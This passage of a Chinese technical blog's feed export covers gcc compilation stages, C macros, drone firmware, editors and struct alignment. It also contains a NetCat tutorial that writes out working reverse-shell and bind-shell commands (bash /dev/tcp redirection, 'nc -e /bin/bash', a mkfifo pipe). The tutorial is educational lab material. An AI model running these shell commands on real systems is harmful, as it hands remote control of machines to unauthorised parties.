<h2 id="完整性"><a href="#完整性" class="headerlink" title="完整性"></a>完整性</h2><p>定义:保证数据的一致性，防止数据被非法用户篡改。<br>策略:利用MAC(消息验证码)机制,一般为MD5,SHA等算法</p>
<h2 id="可用性"><a href="#可用性" class="headerlink" title="可用性"></a>可用性</h2><p>定义:保证合法用户对信息和资源的使用不会被不正当地拒绝。(典型的例如DDOS攻击)<br>策略:网络安全中暂无好的方案,信息安全中可用数据备份来缓解.</p>
<h2 id="可控性"><a href="#可控性" class="headerlink" title="可控性"></a>可控性</h2><p>定义:对信息的传播及内容具有控制能力。<br>策略:各种访问控制,例如ACL包过滤,防火墙等机制.</p>
<h2 id="不可抵赖性"><a href="#不可抵赖性" class="headerlink" title="不可抵赖性"></a>不可抵赖性</h2><p>定义:建立有效的责任机制，防止用户否认其行为，这一点在电子商务中是极其重要的。<br>策略:数字签名,用公钥密码机制,如RSA等.</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;昨天又请教了熊老板关于网络安全的基本要素,当时他上课的时候听了课然后又忘记了,现在总结如下,具体含义可参考各种百科和博文(以下定义源自百度百科)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;机密性&quot;&gt;&lt;a href=&quot;#机密性&quot; class
    
    </summary>
    
      <category term="study" scheme="http://embpgp.github.io/categories/study/"/>
    
      <category term="work" scheme="http://embpgp.github.io/categories/study/work/"/>
    
    
      <category term="network security" scheme="http://embpgp.github.io/tags/network-security/"/>
    
      <category term="information security" scheme="http://embpgp.github.io/tags/information-security/"/>
    
  </entry>
  
  <entry>
    <title>C语言宏定义小试</title>
    <link href="http://embpgp.github.io/2016/09/06/C%E8%AF%AD%E8%A8%80%E5%AE%8F%E5%AE%9A%E4%B9%89%E5%B0%8F%E8%AF%95/"/>
    <id>http://embpgp.github.io/2016/09/06/C语言宏定义小试/</id>
    <published>2016-09-06T12:51:30.000Z</published>
    <updated>2016-09-07T09:39:05.549Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>今天方小白童鞋笔试了CVTE，遇到了很多Linux开发的问题，其实不乏有关于内核配置，boot启动分析相关试题等等，在这里主要分析一下C语言中宏定义的问题.主要侧重于实战了，具体的还是要根据标准来。我用的实验平台是ubuntu 16.04 i386。</p>
</blockquote>
<hr>
<h1 id="gcc编译过程分析"><a href="#gcc编译过程分析" class="headerlink" title="gcc编译过程分析"></a>gcc编译过程分析</h1><p><img src="/images/gcc_program.png" alt="gcc_program"></p>
<p>如上图所示，上图是在<strong>《程序员自我修养》</strong>这本书里面看到的，首先头文件和源文件在预处理阶段会融合在一起，生成.i文件。然后经过编译会生成.s文件，内容是汇编语言形式，之后经过汇编过程后变成.o的目标文件，这个文件其实已经成为了机器码了，但是缺乏加载地址以及函数符号问题未解决等，最后经过和库文件等进行链接生成可执行的二进制文件。在Linux下为elf格式，Windows下为PE格式。执行的时候将由各自的加载器对可执行文件中的代码和数据等进行解析并加载至内存中相应的属性页。当然如果直接一步<code>gcc sources -o target</code>是看不到这些过程的，gcc会一次性完成这些操作。下面我们就来实战一下吧。测试的源代码如下，有兴趣的还可以改用<code>++a</code>看看结果。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> F(x) ((x)*(x))</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> a = <span class="number">4</span>;</div><div class="line">	<span class="comment">//printf("%d\n", F(++a));</span></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, F(a++));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h1 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h1><p>首先我们看下图的源文件，其中就是涉及到了主要矛盾，<strong>宏定义</strong>。这个在C语言中用得相当多的一个技巧。在C++中会推荐使用<strong>const</strong>。具体缘由请自行搜索。像这种运算会产生问题的地方就是将变量填充为单目运算符的时候会发生问题。<br><img src="/images/compile.png" alt="compile"><br>接下来我们键入<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -E mocro_define.c -o mocro_define.i</div></pre></td></tr></table></figure></p>
<p><img src="/images/define_E.png" alt="define_E"><br>我们可以看到在生在.i文件之后，最后的几行代码被改变了，其中就是define被展开了。而且gcc在.i文件中插入了大量的外部引用和声明。总计有800多行。接下来我们看怎么编译。</p>
<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>我们键入以下命令，其中的<code>-masm=intel</code>选项是让生成的汇编代码为intel格式的而非AT&amp;T格式的，个人还是习惯看intel格式的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -S mocro_define.i -o mocro_define.s -masm=intel</div></pre></td></tr></table></figure></p>
<p><img src="/images/define_S.png" alt="define_S"><br>主要的部分如下图所示，其中很多.开头的都是一些符号，不必在意。程序段在开辟新的空间之后直接将4赋值给了<code>[ebp-12]</code>,即a。然后再将它的值送到<code>edx</code>寄存器，之后编译器利用<code>lea</code>指令优化使得<code>a++</code>执行，而后立即回送至内存中的a。之后又使得<code>a++</code>执行并回送至内存中。但是注意到，<code>imul</code>指令执行的时候仍然用的是<code>edx</code>和<code>eax</code>的值，即4*5,而<code>ecx</code>值虽然为6(最后的a)但是并不参与运算。最后直接将<code>eax</code>压栈<code>call printf</code>即可打印出来结果。在这里可以看出两个<code>a++</code>仅仅只有一个值是参与了乘法运算，详情可以参考优先级策略，可以深刻地理解编译器是如何处理这个类似<code>a++</code>运算符的。<br><img src="/images/define_S_main.png" alt="define_S_main"></p>
<h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><p>之后我们键入以下命令继续这个过程：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -c mocro_define.s -o mocro_define.o</div></pre></td></tr></table></figure></p>
<p><img src="/images/define_c.png" alt="define_c"><br>我们用readelf工具可以知道已经生成了与平台相关的目标代码了，这一步gcc内部封装的是as工具，当然我们也可以单独用as命令来执行汇编过程。特别是开发asm程序的时候可能会用到。接下来进行最后的链接过程。</p>
<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>键入以下命令并执行可执行程序：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc mocro_define.o -o mocro_define</div><div class="line">./mocro_define</div></pre></td></tr></table></figure></p>
<p><img src="/images/define_o.png" alt="define_o"><br>最后的结果就是汇编当中的代码分析过程。当然这一步也是gcc内部封装的ld工具，我们也可以手动执行，但是太麻烦，还要解决引入的库文件等问题。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇文章主要还是从C程序的编译过程来逐步拆解分析。<strong>宏定义</strong>本身还是不严格的直接替换式地插入,对于类型检查不严格，对于表达式不计算，才会导致问题的发生。我们稍微调试一下明白了。建议还是从C语言的运算符优先级入手，分析这个过程可能容易很多，因为编译器也是遵照标准来实现的。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;今天方小白童鞋笔试了CVTE，遇到了很多Linux开发的问题，其实不乏有关于内核配置，boot启动分析相关试题等等，在这里主要分析一下C语言中宏定义的问题.主要侧重于实战了，具体的还是要根据标准来。我用的实验平台是ubuntu 16.04 i386
    
    </summary>
    
      <category term="study" scheme="http://embpgp.github.io/categories/study/"/>
    
    
      <category term="C/C++" scheme="http://embpgp.github.io/tags/C-C/"/>
    
      <category term="Linux" scheme="http://embpgp.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>NetCat</title>
    <link href="http://embpgp.github.io/2016/08/26/netcat%E7%AE%80%E8%BF%B0/"/>
    <id>http://embpgp.github.io/2016/08/26/netcat简述/</id>
    <published>2016-08-26T06:17:46.000Z</published>
    <updated>2016-11-04T02:29:28.099Z</updated>
    
    <content type="html"><![CDATA[<p>参考资料:<br><a href="http://netcat.sourceforge.net/" target="_blank" rel="external">http://netcat.sourceforge.net/</a><br><a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/" target="_blank" rel="external">gnucitizen.org</a><br><a href="http://www.oschina.net/translate/linux-netcat-command" target="_blank" rel="external">http://www.oschina.net/translate/linux-netcat-command</a><br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="external">Reverse shell</a><br><a href="https://joncraton.org/blog/46/netcat-for-windows/" target="_blank" rel="external">NetCat for windows</a></p>
<hr>
<h1 id="1-nc能干啥？"><a href="#1-nc能干啥？" class="headerlink" title="1. nc能干啥？"></a>1. nc能干啥？</h1><p>能扫描，能聊天，能监听，能反弹，能穿透，能代理，能传文件….<br>netcat被成为网络工具中的瑞士军刀，具体用法可以参考上述链接或者在*nix系统的shell中键入<code>man nc</code>查看手册．这里建议先好好学习一下Linux系统中管道(| &gt; &lt; &gt;&gt; &lt;&lt;等)的用法以及文件描述符的相关知识．</p>
<hr>
<h1 id="2-栗子"><a href="#2-栗子" class="headerlink" title="2. 栗子:"></a>2. 栗子:</h1><p>扫描的话就暂时不用nc了，有兴趣的话可以参考nmap这个工具的详细用法．灰常好用，还能输出各种格式的扫描结果并导入数据库．</p>
<h2 id="1-聊天"><a href="#1-聊天" class="headerlink" title="1. 聊天:"></a>1. 聊天:</h2><p>我先在终端用ssh连接到一台Linux主机，然后键入<code>nc -l 8888</code>在远程机器的本地进行监听，然后在本机再开一个终端键入<code>nc -n 10.128.54.118 8888</code>即可开始聊天.-l参数表示监听，后面8888表示监听网络端口号，这里省略了监听的网卡．默认为”0.0.0.0”,表示所有网络接口．-n参数表示不要将IP地址进行DNS逆向解析到主机名.<br><img src="/images/nc_liaotian.png" alt="nc_liaotian"></p>
<h2 id="2-监听和反弹shell-reverse-shell"><a href="#2-监听和反弹shell-reverse-shell" class="headerlink" title="2.监听和反弹shell(reverse shell)"></a>2.监听和反弹shell(reverse shell)</h2><p>先在一台主机shell环境中键入<code>nc -l -v -p 8888</code>,然后在另外一台主机中键入<code>bash -i &gt;&amp; /dev/tcp/10.128.54.118/8888 0&gt;&amp;1</code>.Bingo!!!,直接反弹回来一个shell终端.后面指令中的bash -i是启动一个交互式的bash,然后重定向到一个tcp描述符文件，是的，在*nix中，OS的思想是一切都是文件．所以网络连接也是一个文件,<code>&gt;</code>后面加上<code>&amp;</code>表示不是一个简单的文件，而是文件描述符．这属于shell的高级用法，最起码得知道Linux中0,1,2这三个文件描述符默认是对应着标准输入流，标准输出流，标准错误流．而默认对应的真正物理硬件分别是键盘，显示屏和显示屏．因此可以理解为启动了一个交互式bash将标准输出流<code>&gt;</code>重定向到了网络上，然后后面的<code>0&gt;&amp;1</code>表示对于标准输入也重定向到标准输出流，而标准输出流已经输出到了网络上了．所以搞在一起就是全部丢到网络上去．相当于节省了一根管道.<br><img src="/images/nc_reverse_shell.png" alt="Reverse_shell"><br>关于反弹shell的代码网络上有很多，比如<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="external">这里</a>,囊括了包括Bash,Perl,Python,PHP,Ruby,Netcat,Java等，在渗透测试中可能会用到.上述的代码还可以改成下面:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$exec</span> 3&lt;&gt;/dev/tcp/10.128.54.118/8888<span class="comment">#创建3号文件描述符绑定到一个读写的网络连接</span></div><div class="line"><span class="variable">$cat</span> &lt;&amp;3 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;3 2&gt;&amp;1; <span class="keyword">done</span><span class="comment">#cat从3号描述符从读数据然后通过管道丢给while循环，while循环中就读cat的内容并执行，同时将内容重定向到3号描述符，并将错误流也一并回送．</span></div></pre></td></tr></table></figure></p>
<h2 id="3-连接监听的shell-bind-shell"><a href="#3-连接监听的shell-bind-shell" class="headerlink" title="3. 连接监听的shell(bind shell)"></a>3. 连接监听的shell(bind shell)</h2><p>在Server端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$nc</span> <span class="_">-l</span> port <span class="_">-e</span> /bin/bash -i</div></pre></td></tr></table></figure></p>
<p>在Client端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$nc</span> server_ip port</div></pre></td></tr></table></figure></p>
<p>一般用BSD的netcat不支持-e或者-c参数，所以可以通过建立管道文件来进行读写:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$mkfifo</span> /tmp/tmp_fifo</div><div class="line"><span class="variable">$cat</span> /tmp/tmp_fifo | /bin/bash -i 2&gt;&amp;1 | nc <span class="_">-l</span> port &gt; /tmp/tmp_fifo</div></pre></td></tr></table></figure></p>
<p><img src="/images/nc_bind_shell.png" alt="bind_shell"></p>
<h2 id="4-传送文件"><a href="#4-传送文件" class="headerlink" title="4. 传送文件"></a>4. 传送文件</h2><p>说实话，在局域网里面传文件还是有些麻烦的．虽然已经有了ftp,smb等协议工具，但是服务端的配置很麻烦．但是有了nc就好了．利用重定向操作，直接实现顶级的文件传送．要传送目录的话可以先用tar等工具压缩和打包，然后再传送，同时支持加解密工具的使用，使得网络窃听者无法对嗅探的流量进行直接地解密．</p>
<p>Sender:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$nc</span> <span class="_">-l</span> Port &lt; file</div></pre></td></tr></table></figure></p>
<p>Receiver:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$nc</span> IP Port &gt; file</div></pre></td></tr></table></figure></p>
<p><img src="/images/nc_file_send.png" alt="file_send"><br>当然发送者和接受者的重定向也可以反回来使用，都是没问题的．可以多测试一下．如果利用这个小demo再编程做一个文件服务器的应该也可以哦．</p>
<hr>
<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h1><p>对于*nix学习，最好有一本书在手，然后参照命令过一遍，命令很多确实不好记，可以等以后需要的时候再去查，其实用多了就记住了．对于nc这个好的工具目前正好有需求呢所以就学习了一下…</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考资料:&lt;br&gt;&lt;a href=&quot;http://netcat.sourceforge.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://netcat.sourceforge.net/&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://ww
    
    </summary>
    
      <category term="study" scheme="http://embpgp.github.io/categories/study/"/>
    
    
      <category term="network security" scheme="http://embpgp.github.io/tags/network-security/"/>
    
      <category term="shell" scheme="http://embpgp.github.io/tags/shell/"/>
    
      <category term="pipe" scheme="http://embpgp.github.io/tags/pipe/"/>
    
  </entry>
  
  <entry>
    <title>无人机学习概况</title>
    <link href="http://embpgp.github.io/2016/08/25/%E6%97%A0%E4%BA%BA%E6%9C%BA%E5%AD%A6%E4%B9%A0%E6%A6%82%E5%86%B5/"/>
    <id>http://embpgp.github.io/2016/08/25/无人机学习概况/</id>
    <published>2016-08-25T05:53:11.000Z</published>
    <updated>2016-11-04T02:33:13.263Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pixhawk-Ardupilot-交叉编译工具链-QGC-AP"><a href="#Pixhawk-Ardupilot-交叉编译工具链-QGC-AP" class="headerlink" title="Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)"></a>Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)</h1><p>参考资料:<br><a href="http://www.nephen.com/arrange/archive.html" title="老吴" target="_blank" rel="external">老吴学长教程:http://www.nephen.com/arrange/archive.html</a><br><a href="http://ardupilot.org/copter/index.html" target="_blank" rel="external">Ardupilot:http://ardupilot.org/copter/index.html</a><br><a href="http://dev.px4.io/" target="_blank" rel="external">Pixhawk开发者:http://dev.px4.io/</a></p>
<hr>
<h1 id="Pixhawk"><a href="#Pixhawk" class="headerlink" title="Pixhawk"></a>Pixhawk</h1><p>首先稍微介绍一下Pixhawk,它很贵，是的．国外原装的估计的是700多，国内某宝上有很多公司自己仿照它做的板子也得588.目前据我所知道的某宝上卖的最便宜的Pixhawk是梦创团队做的，由于是手工焊制因此还有待提高其工业水平．不扯淡了，想玩无人机的朋友应该都知道大疆这个公司，目前它的无人机市场占有率很高，详情可以搜一搜相关新闻．大疆也很贵(其实要想玩无人机还是得掏钱啊)，上次我们学校一老师让我们观看一下大疆的一款飞机，好像是”悟”系列的，说是从美国带回来的，20000RMB．~__~.所以对于我们一般的爱好者怎么办的？国外开源之王–Pixhawk是首选．硬件开源(为啥能够轻易仿制)，固件开源(降低二次开发难度)，上位机也开源(扩展高级功能)．基本上能够满足无人机平台各个专业的需求．以前它叫做PX4FMU+PX4IO,其实对应到真正的板子上就是一个是stm32f4的芯片，另一个是stm32f1的芯片，主要是它俩加起来搞在一块板子上就是Pixhawk．PX4FMU负责进行高级的浮点运算等，PX4IO负责低级的定时器输出PWM等，两者共同运行了一个叫做Nuttx的嵌入式实时操作系统．如果是买回来的套件，板子肯定已经上载好了bootloader，如果是自己制作，必须在焊接好之后用Jlink等工具首先将bootloader上载进去，而后再通过交叉编译工具链或者上位机用USB接口连接电脑和板子下固件到板子．基础的板子一般只能飞基础的功能，比如自稳模式，定高模式啦．如果要飞高级模式，比如悬停，留待，自动模式啥的得需要GPS或者光流计等可选的硬件设备．所以，还是得舍得花钱…其实说到开源飞控平台有很多，比如国内做得还可以的匿名团队，有兴趣的小伙伴可以去了解一下．下图是梦创的板子.<br><img src="/images/pixhawk.jpg" alt="梦创的板子"></p>
<h1 id="Ardupilot"><a href="#Ardupilot" class="headerlink" title="Ardupilot"></a>Ardupilot</h1><p>这个是一个固件或者说是软件，相对于一般的用户来说就是固件，因为不去更改它．作为开发者来说就是一个软件平台，必须要进行二次更改或者移植去定制自己的功能．首先要说到APM团队，也是一个无人机开发团队，其实最早是PX4团队在Pixhawk上开发出了固件，然后APM也借助了他们的劳动成果在Pixhawk上加入了自己的一个应用程序<strong>ArduCopter</strong>，这个程序作为一个进程在Nuttx里面被nsh脚本启动．而后再进行各种运算和控制…可能玩过航模的童鞋知道ArduCopter,这玩意儿支持很多架构，不只多旋翼，还包括固定翼和小车等．因为APM团队早期是在基于Avr芯片的arduino板子上跑的软件APM2.x，后来发现低端的资源配置已经不能满足大量的运算了，正巧来了Pixhawk，因此APM团队仍然在完成移植和新功能的开发工作上面．我们为什么不用PX4的固件转而来学习APM的固件呢？答案是简单一些，功能上它们俩差不多，但是在功能的源码实现上不太一样．我们可以分别从各自的github仓库里面fork并clone代码到本地用编辑工具(如sublime等)打开查看就知道了．至于怎么分析代码架构，请先学好单片机等相关知识以及飞行器的基本原理，最好有很好的高数基础和信号滤波的概念．而后，学好C++,就可以开始你的DIY之旅了．如果英文够好的话直接去官网看开发者教程就可以了．下图可以看到ArduCopter也是支持很多硬件平台的，我们编译的时候键入<code>make px4-v2</code>即可．键入<code>make px4-v2-upload</code>即可上载代码．我的开发平台是ubuntu 16.04 amd64.<br><img src="/images/targets.png" alt="targets"></p>
<h1 id="交叉编译工具链"><a href="#交叉编译工具链" class="headerlink" title="交叉编译工具链"></a>交叉编译工具链</h1><p>熟悉嵌入式开发的筒子们肯定都知道，我们在写好代码编译后是需要借助第三方电路结构(例如Jlink,串口有时候也支持)将程序从PC下载到板子上去．这是主要是由于指令集不一样所以要进行交叉编译，除非板子上已经装好了系统了…具体到开发Pixhawk所用到的编译器就是<code>arm-none-eabi-gcc</code>家族,详情安装方式参考官网<a href="http://ardupilot.org/dev/docs/building-px4-for-linux-with-make.html" target="_blank" rel="external">APM</a>或者<a href="http://dev.px4.io/starting-installing-linux.html" target="_blank" rel="external">PX4</a>都可以，也可以看我<a href="http://www.nephen.com/2016/01/introduction-to-start-ArduPilot" target="_blank" rel="external">学长的教程</a>,只要搭建好这个环境编译APM或者PX4原生固件都是可以的．建议开发平台为Linux，win上面可能会出很多问题，也不建议在win上装Linux虚拟机,因为我当时就出了问题一直木有解决…最好装个双系统啥的．再说，Linux足够安全(相对概念,具体看设计)，不是吗？下图是我的arm-none-eabi-gcc版本号.<br><img src="/images/arm-none-eabi-gcc.png" alt="arm-none-eabi-gcc"></p>
<h1 id="上位机"><a href="#上位机" class="headerlink" title="上位机"></a>上位机</h1><p>一款好的飞控开发出来，如果没有易于调参的上位机很是麻烦．Ardupilot里面大大小小的参数百多个，最经典的几个PID参数必须要调的．当然运气好机架和参数恰好对应了就不必这么麻烦了．还有些可选的硬件，在上位机里面修改比取修改源码方便多了．Linux上推荐使用QGC和APMPlanner,QGC和APMPlanner都是基于Qt写出来的上位机，直接支持Linux,Win,Mac．APM Planner而且还可以分析飞控上SD卡的飞行记录数据．而Mission Planner是用.net写出来的，在Linux上的话需要安装mono环境才能跑．对于校准加速度计和磁力计的话MP特别麻烦，转很久可能都转不到某些点．而且这里面的上位机几款都是开源的．有兴趣的都可以研究一下mavlink协议以及图形渲染相关编程技术．下图是APMPlanner的截图．<br><img src="/images/APMPlanner.png" alt="APMPlanner"></p>
<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>去年加入的实验室，学stm32f1基础知识，从定时器输出PWM控制电调和定时器输入捕获PWM获取遥控器量，到SPI总线协议收发射频信号，I2C协议获取IMU传感器数据，到基础互补滤波和姿态融合算法，串级PID算法控制PWM输出量．一路走来对飞行器有了基本的认识，今年寒假开始的Pixhawk学习，到近期的电赛结束，算是画上了一个简单的分号吧．感谢各位帮助过我的筒子们，加油吧，学弟学妹们，明年电赛好好干．</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Pixhawk-Ardupilot-交叉编译工具链-QGC-AP&quot;&gt;&lt;a href=&quot;#Pixhawk-Ardupilot-交叉编译工具链-QGC-AP&quot; class=&quot;headerlink&quot; title=&quot;Pixhawk + Ardupilot + 交叉编译工具
    
    </summary>
    
      <category term="study" scheme="http://embpgp.github.io/categories/study/"/>
    
      <category term="misc" scheme="http://embpgp.github.io/categories/study/misc/"/>
    
    
      <category term="C/C++" scheme="http://embpgp.github.io/tags/C-C/"/>
    
      <category term="emb" scheme="http://embpgp.github.io/tags/emb/"/>
    
      <category term="uav" scheme="http://embpgp.github.io/tags/uav/"/>
    
      <category term="pixhawk" scheme="http://embpgp.github.io/tags/pixhawk/"/>
    
  </entry>
  
  <entry>
    <title>vim_and_emacs</title>
    <link href="http://embpgp.github.io/2016/08/23/vim-and-emacs/"/>
    <id>http://embpgp.github.io/2016/08/23/vim-and-emacs/</id>
    <published>2016-08-23T06:20:59.000Z</published>
    <updated>2016-11-04T02:30:08.342Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>在学习Linux的时候，最好从console开始，完全脱离窗体束缚，感受最原始的类DOS时代的<code>程序员使命感</code>,由于Linux下编辑器也是五花八门，不过最流行的莫过于Vim和Emacs，在这里附上它们的一些链接便于学习．</p>
</blockquote>
<p>参考资料：<br><a href="http://vimdoc.sourceforge.net/" title="Vimdoc" target="_blank" rel="external">Vimdoc:http://vimdoc.sourceforge.net/</a><br><a href="http://vimdoc.sourceforge.net/vimum.html" target="_blank" rel="external">Vimnum:http://vimdoc.sourceforge.net/vimum.html</a><br><a href="http://www.caole.net/diary/vim.html#sec-14" target="_blank" rel="external">caole_Vim:http://www.caole.net/diary/vim.html#sec-14</a><br><a href="http://dsec.pku.edu.cn/~jinlong/vi/Vi.html" target="_blank" rel="external">caole_Vim_improved:http://dsec.pku.edu.cn/~jinlong/vi/Vi.html</a><br><a href="http://www.caole.net/diary/emacs_tips.html" target="_blank" rel="external">caole_Emacs:http://www.caole.net/diary/emacs_tips.html</a><br><a href="https://github.com/yangyangwithgnu/use_vim_as_ide" target="_blank" rel="external">https://github.com/yangyangwithgnu/use_vim_as_ide</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;在学习Linux的时候，最好从console开始，完全脱离窗体束缚，感受最原始的类DOS时代的&lt;code&gt;程序员使命感&lt;/code&gt;,由于Linux下编辑器也是五花八门，不过最流行的莫过于Vim和Emacs，在这里附上它们的一些链接便于学习．&lt;/p
    
    </summary>
    
      <category term="study" scheme="http://embpgp.github.io/categories/study/"/>
    
    
      <category term="Linux" scheme="http://embpgp.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>memory_align</title>
    <link href="http://embpgp.github.io/2016/08/21/memory-align/"/>
    <id>http://embpgp.github.io/2016/08/21/memory-align/</id>
    <published>2016-08-21T13:24:53.000Z</published>
    <updated>2016-09-12T10:36:41.897Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于C-C-中结构体-类-内存对齐问题"><a href="#关于C-C-中结构体-类-内存对齐问题" class="headerlink" title="关于C/C++中结构体(类)内存对齐问题"></a>关于C/C++中结构体(类)内存对齐问题</h2><hr>
<blockquote>
<p>各种笔试面试都会涉及的问题，具体的可以查阅相关标准(如C99,C11等)或者翻阅国外知名论坛<a href="http://stackoverflow.com/" title="Stack Overflow" target="_blank" rel="external">stackoverflow</a>等寻找相关资料进一步分析，我个人的一些总结如下，如有不对之处，还请诸位不吝赐教．</p>
</blockquote>
<hr>
<p>可参考资料：<br><a href="https://en.wikipedia.org/wiki/Data_structure_alignment#Problems" title="维基百科" target="_blank" rel="external">维基百科</a><br><a href="http://stackoverflow.com/questions/2554229/memory-alignment-within-gcc-structs" target="_blank" rel="external">StackOverflow GCC Structure</a><br><a href="https://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html" target="_blank" rel="external">GCC文档</a></p>
<h3 id="1-首先放出现代PC编译器在实现的时候对于字长的一些典型约定"><a href="#1-首先放出现代PC编译器在实现的时候对于字长的一些典型约定" class="headerlink" title="1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:"></a>1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:</h3><h4 id="32位编译器："><a href="#32位编译器：" class="headerlink" title="32位编译器："></a>32位编译器：</h4><pre><code>char ：1个字节
char*（即指针变量）: 4个字节（32位的寻址空间是2^32, 即32个bit，也就是4个字节。同理64位编译器）
short int : 2个字节
int：  4个字节
unsigned int : 4个字节
float:  4个字节
double:   8个字节
long:   4个字节
long long:  8个字节
unsigned long:  4个字节
</code></pre><h4 id="64位编译器："><a href="#64位编译器：" class="headerlink" title="64位编译器："></a>64位编译器：</h4><pre><code>char ：1个字节
char* (即指针变量): 8个字节
short int : 2个字节
int：  4个字节
unsigned int : 4个字节
float:  4个字节
double:   8个字节
long:   8个字节
long long:  8个字节
unsigned long:  8个字节  
</code></pre><p>其中特别需要说明的一点就是指针类型的，任何类型的指针字长(当然包括结构体和类等复合类型)几乎应该只与编译器平台或者说是处理器地址总线长度有关(当然类似8086这种16位的处理器20根地址线的CPU等就另当别论了).关于这一点我认为学过体系结构和组成原理的同学应该会有深刻体会(我们组成原理课有实验就是按照教程实现一个简单的CPU)．在C语言中直接使用操作符sizeof(type)就可以得到字节大小，注意这个sizeof不是一个函数而是一个操作符．操作符的话表明结果已经在编译的时候确定了，而函数的话如果编译器不进行优化则等到运行时被调用才会返回值．关于这一点sizeof在有数组的参数中会发生一些奇妙的事情．</p>
<hr>
<h3 id="2-变量排放规则-自己的见解"><a href="#2-变量排放规则-自己的见解" class="headerlink" title="2. 变量排放规则(自己的见解)"></a>2. 变量排放规则(自己的见解)</h3><h4 id="1-内置类型对象-如char、int-lt-现代PC编译器普遍为4字节-gt-等-的对齐起始地址为其本身大小和编译器默认大小（或用-pragma-pack（n-指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1-2-4-8等2的幂值）中最小的一个的整数倍"><a href="#1-内置类型对象-如char、int-lt-现代PC编译器普遍为4字节-gt-等-的对齐起始地址为其本身大小和编译器默认大小（或用-pragma-pack（n-指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1-2-4-8等2的幂值）中最小的一个的整数倍" class="headerlink" title="1. 内置类型对象(如char、int&lt;现代PC编译器普遍为4字节&gt;等)的对齐起始地址为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍."></a>1. 内置类型对象(如char<1字节>、int&lt;现代PC编译器普遍为4字节&gt;等)的<strong>对齐起始地址</strong>为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍.</1字节></h4><h4 id="2-整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用-pragma-pack-n-指定的n中两者较小的那个的整数倍-而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。"><a 